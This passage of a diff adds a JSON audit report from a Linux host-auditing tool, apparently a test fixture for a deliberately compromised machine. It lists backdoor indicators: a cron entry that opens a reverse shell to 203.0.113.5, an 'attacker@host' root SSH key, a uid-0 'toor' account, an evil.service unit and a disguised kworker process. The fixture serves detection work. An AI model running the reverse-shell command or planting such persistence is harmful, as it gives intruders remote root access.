+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-002",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-f54226e8d71cf44f",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_unix.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-f8ff06ec2ac0867d",
+   "type": "command",
+   "ref": "route",
+   "excerpts": [
+    "eth0 dest=0.0.0.0 gw=10.0.0.1 mask=0.0.0.0",
+    "eth0 dest=10.0.0.0 gw=0.0.0.0 mask=255.255.255.0"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ROUTE-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-fcf4c0e84d8ce633",
+   "type": "file",
+   "ref": "/home/nopass/.keep",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-fef3e00167578164",
+   "type": "network",
+   "ref": "10.0.0.10:22 -> 10.0.0.77:50000",
+   "excerpts": [
+    "process sshd/100"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-fff9fbaffd78ef99",
+   "type": "command",
+   "ref": "interface",
+   "excerpts": [
+    "eth0"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-IFACE-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  }
+ ],
+ "inventory": {
+  "coverage": [
+   {
+    "domain": "config",
+    "scope": "core",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "dns",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "firewall",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "hosts",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "kmod",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "logging",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "logindefs",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "mounts",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "pam",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "sshd",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "sudoers",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "suid",
+    "status": "complete"
+   },
+   {
+    "domain": "config",
+    "scope": "sysctl",
+    "status": "complete"
+   },
+   {
+    "domain": "groups",
+    "status": "complete"
+   },
+   {
+    "domain": "listeners",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "apt",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "autostart",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "shell",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "ssh-authkeys",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "startup",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "systemd",
+    "status": "complete"
+   },
+   {
+    "domain": "persistence",
+    "scope": "udev",
+    "status": "complete"
+   },
+   {
+    "domain": "processes",
+    "status": "complete"
+   },
+   {
+    "domain": "scheduled_tasks",
+    "scope": "at",
+    "status": "complete"
+   },
+   {
+    "domain": "scheduled_tasks",
+    "scope": "cron",
+    "status": "complete"
+   },
+   {
+    "domain": "services",
+    "status": "complete"
+   },
+   {
+    "domain": "users",
+    "status": "complete"
+   }
+  ],
+  "records": [
+   {
+    "domain": "config",
+    "key": "config:core:core_pattern",
+    "attrs": {
+     "value": "core"
+    },
+    "scope": "core",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/proc/sys/kernel/core_pattern"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:core:suid_dumpable",
+    "attrs": {
+     "value": "0"
+    },
+    "scope": "core",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/proc/sys/fs/suid_dumpable"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:dns:resolv.conf",
+    "attrs": {
+     "nameservers": [
+      "10.0.0.2"
+     ],
+     "search": [
+      "corp.example"
+     ]
+    },
+    "scope": "dns",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/resolv.conf"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:hosts:32faef13c452afd6",
+    "attrs": {
+     "entry": "203.0.113.9 updates.example.test"
+    },
+    "scope": "hosts",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/hosts"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:logging:pipeline",
+    "attrs": {
+     "syslog_daemon": "no",
+     "journal_storage": "auto"
+    },
+    "scope": "logging"
+   },
+   {
+    "domain": "config",
+    "key": "config:logindefs:ENCRYPT_METHOD",
+    "attrs": {
+     "value": "SHA512"
+    },
+    "scope": "logindefs",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/login.defs"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:logindefs:PASS_MAX_DAYS",
+    "attrs": {
+     "value": "90"
+    },
+    "scope": "logindefs",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/login.defs"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:logindefs:PASS_MIN_DAYS",
+    "attrs": {
+     "value": "1"
+    },
+    "scope": "logindefs",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/login.defs"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:logindefs:PASS_WARN_AGE",
+    "attrs": {
+     "value": "7"
+    },
+    "scope": "logindefs",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/login.defs"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:logindefs:UMASK",
+    "attrs": {
+     "value": "022"
+    },
+    "scope": "logindefs",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/login.defs"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:logindefs:USERGROUPS_ENAB",
+    "attrs": {
+     "value": "yes"
+    },
+    "scope": "logindefs",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/login.defs"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "mount:/tmp",
+    "attrs": {
+     "fstype": "tmpfs",
+     "flags": []
+    },
+    "scope": "mounts",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/proc/mounts"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam-module:/lib/x86_64-linux-gnu/security/pam_deny.so",
+    "attrs": {
+     "sha256": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/lib/x86_64-linux-gnu/security/pam_deny.so"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam-module:/lib/x86_64-linux-gnu/security/pam_limits.so",
+    "attrs": {
+     "sha256": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/lib/x86_64-linux-gnu/security/pam_limits.so"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam-module:/lib/x86_64-linux-gnu/security/pam_nologin.so",
+    "attrs": {
+     "sha256": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/lib/x86_64-linux-gnu/security/pam_nologin.so"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam-module:/lib/x86_64-linux-gnu/security/pam_permit.so",
+    "attrs": {
+     "sha256": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/lib/x86_64-linux-gnu/security/pam_permit.so"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam-module:/lib/x86_64-linux-gnu/security/pam_succeed_if.so",
+    "attrs": {
+     "sha256": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/lib/x86_64-linux-gnu/security/pam_succeed_if.so"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam-module:/lib/x86_64-linux-gnu/security/pam_unix.so",
+    "attrs": {
+     "sha256": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/lib/x86_64-linux-gnu/security/pam_unix.so"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/bypass2",
+    "attrs": {
+     "sha256": "19c7ca5d99e8eb2dd3dac90ccd404813e54bfa817a2b76a16691183f75bbb420",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/bypass2"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/bypass3",
+    "attrs": {
+     "sha256": "fbb3fb56c982f03c80d01194ab07160809b272b7233f1b314e19ae916a22b021",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/bypass3"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/common-auth",
+    "attrs": {
+     "sha256": "a860c1e612b317bf96ac64a9027067458f06101bda4a6209bca1aaba2dfd0eba",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/common-auth"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/login-bad",
+    "attrs": {
+     "sha256": "9c7ed751b9447a0892a7f669a2faaed111744ce79cb756e318ff65ffcca5d8a2",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/login-bad"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/passwd",
+    "attrs": {
+     "sha256": "3bd218ac72814cb0c34a003b523c54c2111a0aa39f6a66873b6f662e2be30e5a",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/sshd",
+    "attrs": {
+     "sha256": "1bfeb57648166dd4900ab4dcb245ef696ccffda4e6d1e3428a3e38549c903f2d",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/sshd"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:pam:/etc/pam.d/su-bad",
+    "attrs": {
+     "sha256": "8608641ee61d2c8d26cc02674a9f4adb141a32ec341c0cef32c3293f0b36f8af",
+     "mode": "644"
+    },
+    "scope": "pam",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/pam.d/su-bad"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:sudoers:/etc/sudoers#39c85150ae359417",
+    "attrs": {
+     "file": "/etc/sudoers",
+     "rule": "Defaults env_reset"
+    },
+    "scope": "sudoers",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/sudoers"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:sudoers:/etc/sudoers#5eb0c9facbb6ee60",
+    "attrs": {
+     "file": "/etc/sudoers",
+     "rule": "%sudo ALL=(ALL:ALL) ALL"
+    },
+    "scope": "sudoers",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/sudoers"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:sudoers:/etc/sudoers#6df154bd477027b4",
+    "attrs": {
+     "file": "/etc/sudoers",
+     "rule": "root ALL=(ALL:ALL) ALL"
+    },
+    "scope": "sudoers",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/sudoers"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:sudoers:/etc/sudoers.d/90-ops#a8c56979598bb4e6",
+    "attrs": {
+     "file": "/etc/sudoers.d/90-ops",
+     "rule": "bob ALL=(ALL) NOPASSWD: ALL"
+    },
+    "scope": "sudoers",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/sudoers.d/90-ops"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:sysctl:fs.suid_dumpable",
+    "attrs": {
+     "value": "0"
+    },
+    "scope": "sysctl",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/proc/sys/fs/suid_dumpable"
+     }
+    ]
+   },
+   {
+    "domain": "config",
+    "key": "config:sysctl:net.ipv4.ip_forward",
+    "attrs": {
+     "value": "1"
+    },
+    "scope": "sysctl",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/proc/sys/net/ipv4/ip_forward"
+     }
+    ]
+   },
+   {
+    "domain": "groups",
+    "key": "group:alice",
+    "attrs": {
+     "gid": "1000",
+     "members": []
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/group"
+     }
+    ]
+   },
+   {
+    "domain": "groups",
+    "key": "group:docker",
+    "attrs": {
+     "gid": "998",
+     "members": [
+      "bob"
+     ],
+     "primary_members": []
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/group"
+     }
+    ]
+   },
+   {
+    "domain": "groups",
+    "key": "group:root",
+    "attrs": {
+     "gid": "0",
+     "members": [],
+     "primary_members": [
+      "root",
+      "toor"
+     ]
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/group"
+     }
+    ]
+   },
+   {
+    "domain": "groups",
+    "key": "group:sudo",
+    "attrs": {
+     "gid": "27",
+     "members": [
+      "alice"
+     ],
+     "primary_members": []
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/group"
+     }
+    ]
+   },
+   {
+    "domain": "listeners",
+    "key": "listener:tcp/*/6379",
+    "attrs": {
+     "proto": "tcp",
+     "bind": "*",
+     "port": "6379",
+     "process": "redis-server"
+    },
+    "volatile": {
+     "pid": "130"
+    }
+   },
+   {
+    "domain": "listeners",
+    "key": "listener:tcp/0.0.0.0/22",
+    "attrs": {
+     "proto": "tcp",
+     "bind": "0.0.0.0",
+     "port": "22",
+     "process": "sshd"
+    },
+    "volatile": {
+     "pid": "100"
+    }
+   },
+   {
+    "domain": "listeners",
+    "key": "listener:tcp/0.0.0.0/23",
+    "attrs": {
+     "proto": "tcp",
+     "bind": "0.0.0.0",
+     "port": "23",
+     "process": "telnetd"
+    },
+    "volatile": {
+     "pid": "110"
+    }
+   },
+   {
+    "domain": "listeners",
+    "key": "listener:tcp/0.0.0.0/9999",
+    "attrs": {
+     "proto": "tcp",
+     "bind": "0.0.0.0",
+     "port": "9999",
+     "process": "nc"
+    },
+    "volatile": {
+     "pid": "140"
+    }
+   },
+   {
+    "domain": "listeners",
+    "key": "listener:tcp/127.0.0.1/3306",
+    "attrs": {
+     "proto": "tcp",
+     "bind": "127.0.0.1",
+     "port": "3306",
+     "process": "mysqld"
+    },
+    "volatile": {
+     "pid": "120"
+    }
+   },
+   {
+    "domain": "listeners",
+    "key": "listener:udp/127.0.0.53/53",
+    "attrs": {
+     "proto": "udp",
+     "bind": "127.0.0.53",
+     "port": "53",
+     "process": "systemd-resolve"
+    },
+    "volatile": {
+     "pid": "5"
+    }
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:shell:/etc/profile.d/clean.sh",
+    "attrs": {
+     "sha256": "bd0f56b7a693b0d2ff0a98c8fc0bdc1e3cd558ba57afb607615bfb2a637d22b0",
+     "mode": "644",
+     "lines": "1",
+     "line_ids": [
+      "3c244fa6b21b"
+     ]
+    },
+    "scope": "shell",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/profile.d/clean.sh"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:shell:/etc/profile.d/x11.sh",
+    "attrs": {
+     "sha256": "e073128a231e9b2d2b673ea87121a02e58bd827dc1899fd69acdea50c64f2fdf",
+     "mode": "644",
+     "lines": "3",
+     "line_ids": [
+      "0b1b0346cc98",
+      "2006a8c03a0c",
+      "400065e1e375"
+     ]
+    },
+    "scope": "shell",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/profile.d/x11.sh"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:shell:/home/alice/.bashrc",
+    "attrs": {
+     "sha256": "9ed77cbf85d6c07da87998f1001fed6198d961df4e2df1d1c41b37f2753a169c",
+     "mode": "644",
+     "lines": "1",
+     "line_ids": [
+      "1946717ca649"
+     ]
+    },
+    "scope": "shell",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/home/alice/.bashrc"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:ssh-authkey:alice:1247910f299abbd4595368c7",
+    "attrs": {
+     "owner": "alice",
+     "type": "ssh-ed25519",
+     "options": "no",
+     "file": "/home/alice/.ssh/authorized_keys"
+    },
+    "scope": "ssh-authkeys",
+    "volatile": {
+     "label": "alice@laptop"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/home/alice/.ssh/authorized_keys"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:ssh-authkey:alice:f690da64e35050da0df65168",
+    "attrs": {
+     "owner": "alice",
+     "type": "ssh-rsa",
+     "options": "yes",
+     "file": "/home/alice/.ssh/authorized_keys"
+    },
+    "scope": "ssh-authkeys",
+    "volatile": {
+     "label": "forced"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/home/alice/.ssh/authorized_keys"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:ssh-authkey:root:165a5affa810318b561880f3",
+    "attrs": {
+     "owner": "root",
+     "type": "ssh-ed25519",
+     "options": "no",
+     "file": "/root/.ssh/authorized_keys"
+    },
+    "scope": "ssh-authkeys",
+    "volatile": {
+     "label": "attacker@host"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/root/.ssh/authorized_keys"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:ssh-authkey:toor:165a5affa810318b561880f3",
+    "attrs": {
+     "owner": "toor",
+     "type": "ssh-ed25519",
+     "options": "no",
+     "file": "/root/.ssh/authorized_keys"
+    },
+    "scope": "ssh-authkeys",
+    "volatile": {
+     "label": "attacker@host"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/root/.ssh/authorized_keys"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:startup:/etc/ld.so.preload",
+    "attrs": {
+     "sha256": "e575b30252fd7f91e51c33d68a59d390026dc4023180972b4fd95b8102661e4f",
+     "mode": "644",
+     "lines": "1",
+     "line_ids": [
+      "832f1878e91a"
+     ]
+    },
+    "scope": "startup",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/ld.so.preload"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:startup:/etc/rc.local",
+    "attrs": {
+     "sha256": "908d4675d9e186a322f9f6f6866c4de665d4161e96680ce9123d638357fd3f35",
+     "mode": "644",
+     "lines": "2",
+     "line_ids": [
+      "bbbfc4163dff",
+      "c22995adc297"
+     ]
+    },
+    "scope": "startup",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/rc.local"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:systemd:/etc/systemd/system/evil.service",
+    "attrs": {
+     "sha256": "079882e0b43ba67233705ff0f2662fcdc033e5e4b66ed02a78027dd9eb92c542",
+     "mode": "644",
+     "lines": "6",
+     "line_ids": [
+      "f569cfd2a988",
+      "5ace21e3f659",
+      "e52b2db1cfed",
+      "baaf5372a97f",
+      "f3dc335f5d92",
+      "8a343575ed60"
+     ]
+    },
+    "scope": "systemd",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/systemd/system/evil.service"
+     }
+    ]
+   },
+   {
+    "domain": "persistence",
+    "key": "persist:systemd:/etc/systemd/system/ok.service",
+    "attrs": {
+     "sha256": "c31d27ea8b8b7b1b636123477ca4d8a2b0a7ffa75c65418f136515bf783c116d",
+     "mode": "644",
+     "lines": "2",
+     "line_ids": [
+      "e52b2db1cfed",
+      "45f87273e2c6"
+     ]
+    },
+    "scope": "systemd",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/systemd/system/ok.service"
+     }
+    ]
+   },
+   {
+    "domain": "processes",
+    "key": "process:alice:bash",
+    "attrs": {
+     "user": "alice",
+     "comm": "bash",
+     "exe": "/usr/bin/bash"
+    },
+    "volatile": {
+     "pid": "200",
+     "ppid": "100",
+     "cmdline": "-bash"
+    }
+   },
+   {
+    "domain": "processes",
+    "key": "process:alice:kworker",
+    "attrs": {
+     "user": "alice",
+     "comm": "kworker",
+     "exe": "/home/alice/.cache/kw"
+    },
+    "volatile": {
+     "pid": "301",
+     "ppid": "200",
+     "cmdline": "[kworker/0:0]"
+    }
+   },
+   {
+    "domain": "processes",
+    "key": "process:alice:payload",
+    "attrs": {
+     "user": "alice",
+     "comm": "payload",
+     "exe": "/tmp/payload (deleted)"
+    },
+    "volatile": {
+     "pid": "300",
+     "ppid": "200",
+     "cmdline": "/tmp/payload --password <redacted>"
+    }
+   },
+   {
+    "domain": "processes",
+    "key": "process:root:sshd",
+    "attrs": {
+     "user": "root",
+     "comm": "sshd",
+     "exe": "/usr/sbin/sshd"
+    },
+    "volatile": {
+     "pid": "100",
+     "ppid": "1",
+     "cmdline": "/usr/sbin/sshd -D"
+    }
+   },
+   {
+    "domain": "processes",
+    "key": "process:root:systemd",
+    "attrs": {
+     "user": "root",
+     "comm": "systemd",
+     "exe": "/usr/lib/systemd/systemd"
+    },
+    "volatile": {
+     "pid": "1",
+     "ppid": "0",
+     "cmdline": "/sbin/init"
+    }
+   },
+   {
+    "domain": "scheduled_tasks",
+    "key": "cron:/etc/cron.d/backdoor#265a75d084699bac",
+    "attrs": {
+     "file": "/etc/cron.d/backdoor",
+     "entry": "*/5 * * * * root bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
+    },
+    "scope": "cron",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/cron.d/backdoor"
+     }
+    ]
+   },
+   {
+    "domain": "scheduled_tasks",
+    "key": "cron:/etc/cron.d/benign#7c9182fe599852c1",
+    "attrs": {
+     "file": "/etc/cron.d/benign",
+     "entry": "0 3 * * * root /usr/local/bin/backup.sh --password=<redacted>"
+    },
+    "scope": "cron",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/cron.d/benign"
+     }
+    ]
+   },
+   {
+    "domain": "scheduled_tasks",
+    "key": "cron:/etc/crontab#979b3f06d34f1597",
+    "attrs": {
+     "file": "/etc/crontab",
+     "entry": "SHELL=/bin/sh"
+    },
+    "scope": "cron",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/crontab"
+     }
+    ]
+   },
+   {
+    "domain": "scheduled_tasks",
+    "key": "cron:/etc/crontab#a7b2c40c29edce3b",
+    "attrs": {
+     "file": "/etc/crontab",
+     "entry": "17 * * * * root cd / && run-parts /etc/cron.hourly"
+    },
+    "scope": "cron",
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/crontab"
+     }
+    ]
+   },
+   {
+    "domain": "services",
+    "key": "service:backup.service",
+    "attrs": {
+     "active": "failed",
+     "sub": "failed",
+     "enabled": "no"
+    }
+   },
+   {
+    "domain": "services",
+    "key": "service:cron.service",
+    "attrs": {
+     "active": "active",
+     "sub": "running",
+     "enabled": "enabled"
+    }
+   },
+   {
+    "domain": "services",
+    "key": "service:ssh.service",
+    "attrs": {
+     "active": "active",
+     "sub": "running",
+     "enabled": "enabled"
+    }
+   },
+   {
+    "domain": "services",
+    "key": "service:telnet.service",
+    "attrs": {
+     "active": null,
+     "sub": null,
+     "enabled": "enabled"
+    }
+   },
+   {
+    "domain": "users",
+    "key": "user:alice",
+    "attrs": {
+     "uid": "1000",
+     "gid": "1000",
+     "home": "/home/alice",
+     "shell": "/bin/bash",
+     "password": "set"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:bob",
+    "attrs": {
+     "uid": "1001",
+     "gid": "1001",
+     "home": "/home/bob",
+     "shell": "/bin/bash",
+     "password": null
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:daemon",
+    "attrs": {
+     "uid": "1",
+     "gid": "1",
+     "home": "/usr/sbin",
+     "shell": "/usr/sbin/nologin",
+     "password": "locked"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:nopass",
+    "attrs": {
+     "uid": "1002",
+     "gid": "1002",
+     "home": "/home/nopass",
+     "shell": "/bin/bash",
+     "password": "empty"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:postgres",
+    "attrs": {
+     "uid": "110",
+     "gid": "116",
+     "home": "/var/lib/postgresql",
+     "shell": "/bin/bash",
+     "password": null
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:root",
+    "attrs": {
+     "uid": "0",
+     "gid": "0",
+     "home": "/root",
+     "shell": "/bin/bash",
+     "password": "set"
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:sync",
+    "attrs": {
+     "uid": "4",
+     "gid": "65534",
+     "home": "/bin",
+     "shell": "/bin/sync",
+     "password": null
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:toor",
+    "attrs": {
+     "uid": "0",
+     "gid": "0",
+     "home": "/root",
+     "shell": "/bin/bash",
+     "password": null
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:twin",
+    "attrs": {
+     "uid": "1000",
+     "gid": "1000",
+     "home": "/home/twin",
+     "shell": "/bin/sh",
+     "password": null
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   },
+   {
+    "domain": "users",
+    "key": "user:www-data",
+    "attrs": {
+     "uid": "33",
+     "gid": "33",
+     "home": "/var/www",
+     "shell": "/bin/bash",
+     "password": null
+    },
+    "evidence": [
+     {
+      "type": "file",
+      "ref": "/etc/passwd"
+     }
+    ]
+   }
+  ]
+ },
+ "errors": [
+  {
+   "module": "linux.network",
+   "code": "TOOL_MISSING",
